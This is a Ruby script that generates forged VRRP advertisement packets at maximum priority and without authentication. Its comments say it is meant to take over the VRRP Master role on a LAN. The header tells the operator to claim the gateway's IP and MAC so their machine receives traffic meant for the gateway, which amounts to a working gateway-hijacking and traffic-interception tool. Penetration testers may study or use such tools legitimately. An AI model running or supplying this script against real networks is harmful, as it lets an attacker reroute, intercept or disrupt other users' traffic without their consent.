#!/usr/bin/env ruby

#
# VRRP packet generator - extended example of Racket VRRP module usage. Based
# on `vrrp` example by Jon Hart.
#
# Script can be used to take over VRRP Master role (by default priority of
# crafted packets is set to 255).
#
# While trying to take over Master role you need to assure that your local
# machine will handle traffic destined to gateway VIP address (e.g. by setting
# correct IP and MAC on your network interface). Most network gear will
# additionally issue IGMP Membership report (we are dealing with multicast
# here) and/or Gratuitous ARP messages while failing over. Depending on
# network environment it may be profitable to issue IGMP and ARP messages to
# ensure seamless transition for end hosts.
#
# Use at your own risk. I hold no responsibility for use of this code by you.
#
# by jj <jozwiack @ gmail.com>
#

require 'rubygems'
require 'racket'
require 'optparse'

include Racket

opts = {}
optparse = OptionParser.new do |o|
  o.banner = "\nUsage #{o.program_name} <options>"
  o.set_summary_width(20)

  opts[:int] = nil
  o.on('-i', '--if IFACE', "Interface name") do |i|
    opts[:int] = i
  end

  opts[:src] = nil
  o.on('-s', '--src SRCIP', "Source IPv4 address") do |s|
    opts[:src] = s
  end

  opts[:dst] = "224.0.0.18"
  o.on('-d', '--dst DSTIP',
       "Destination multicast address. Default: #{opts[:dst]}") do |d|
    opts[:dst] = d
  end

  opts[:vrid] = 1
  o.on('-v', '--vrid VRID', Integer,
       "Virtual router ID. Default: #{opts[:vrid]}") do |v|
    opts[:vrid] = v
  end

  opts[:addr] = nil
  o.on('-a', '--addr VIP', "Virtual gateway IP") do |a|
    opts[:addr] = a
  end

  opts[:prio] = 255
  o.on('-p', '--prio PRIO', Integer,
       "VRRP priority. Default: #{opts[:prio]}") do |p|
    opts[:prio] = p
  end

  o.on( '-h', '--help', "Display help screen") do
    puts o
    exit
  end
end

optparse.parse!

if (opts[:int].nil? || opts[:src].nil? || opts[:addr].nil?)
  puts "[!] Please define missing options"
  puts optparse
  exit
end

puts "\nGenerating VRRP packets with following options:"
puts "\tInterface: #{opts[:int]}"
puts "\tSource IP: #{opts[:src]}"
puts "\tDestination IP: #{opts[:dst]}"
puts "\tVRID: #{opts[:vrid]}"
puts "\tVirtual gateway IP: #{opts[:addr]}"
puts "\tVRRP priority: #{opts[:prio]}"
puts " "

n = Racket::Racket.new
n.iface = opts[:int]

n.l2 = L2::Ethernet.new
n.l2.ethertype = 0x0800
n.l2.dst_mac = "01:00:5e:00:00:12"
n.l2.src_mac = "00:00:5e:00:01:#{'%x' % opts[:vrid]}"

n.l3 = L3::IPv4.new
n.l3.src_ip = opts[:src]
n.l3.dst_ip = opts[:dst]
# TTL value as defined in RFC for VRRP
n.l3.ttl = 255
n.l3.id = 0x0000
n.l3.protocol = 112

n.l4 = L4::VRRP.new
n.l4.version = 2
# Type = 1 (Advertisement)
n.l4.type = 1
# Auth Type = 0 (No auth)
n.l4.auth_type = 0
n.l4.add_ip(opts[:addr])
n.l4.priority = opts[:prio]
n.l4.id = opts[:vrid]
n.l4.interval = 1
# Pad packet with 0's
n.l4.add_auth("")

while (true)
  begin
    p = n.sendpacket
    puts "Sent VRRP packet: #{p} bytes"
    sleep 1.0
  rescue Interrupt
    puts "\nInterrupted by user"
    exit
  end
end
